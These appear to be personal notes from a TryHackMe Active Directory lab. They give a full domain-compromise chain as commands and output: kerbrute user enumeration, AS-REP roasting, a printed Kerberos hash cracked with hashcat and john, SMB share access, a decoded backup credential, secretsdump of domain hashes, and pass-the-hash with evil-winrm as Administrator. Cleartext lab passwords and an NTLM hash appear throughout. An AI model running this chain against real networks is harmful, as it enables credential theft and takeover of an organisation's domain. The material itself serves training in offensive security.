

10.201.75.51



```powershell
# 1. enumerated the users  (the users file was given)
kerbrute userenum --dc $ip -d THM-AD  userlist.txt

# 2. Saved the found users in another file and did ASREPRoasting attack
# ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set
impacket-GetNPUsers THM-AD/ -usersfile foundUsers.txt -no-pass -dc-ip $ip

# 3. Found hash of svc-admin user:

$krb5asrep$23$svc-admin@THM-AD:e6728ec0b83852bb0ff2d43dc4a9a034$df072381f836f68ae86a8f014f58eead8e6e54b9db0923ac1a95cd917eba18fe1164137b1039a4a4d04e6a0d218c0b2dc50c609bc62fa0ac22c8f1bdde5bc779020a9f94b9bb8041d18d5f6ddbf96a3956c3dc2f00a1183d78a7a940d1447a199aa9a479e445b67d4ea69168d9c49eded2fe18db10285c2429f0066c2bfb5a81f20ffe4dfc1020790fcc2d3efaeae7815f199beb6b31ebed399e9692fb850aa066382465a2b969543600b99f832e5ac807d597f4b7dbee5e29226d2af4d620bcd22fbb7b7d4ba1d6d4bd36eb106175c8e59e66044d0ae9a521a63239d2b18f29c6d98d22d102178ecf


# 4.Cracked the hash (passwordlist.txt was given)
hashcat -m 18200 hash.txt passwordlist.txt
john --format=krb5asrep hash.txt -wordlist=passwordlist.txt 

	password: management2005
	

# 5. Enemurate shres with the creds
nxc smb $ip -u "svc-admin" -p "management2005" --shares

# 6. Access shares:
smbclient //$ip/backup -U "svc-admin%management2005"

#7. Download backup credentials file with the following content:
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw

#8. Base64 Decode:
backup@spookysec.local:backup2517860  

#9 dump secrets with impacket
impacket-secretsdump -dc-ip $ip THM-AD/backup:backup2517860@10.201.53.241 

# Administrator secretdump:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::

# 10. Pass The Hash:
evil-winrm -i '10.201.53.241' -u 'Administrator' -H '0e0363213e37b94221497260b0bcb4fc'

# 11. Find flags

```


# Creds:

```powershell
svc-admin : management2005

```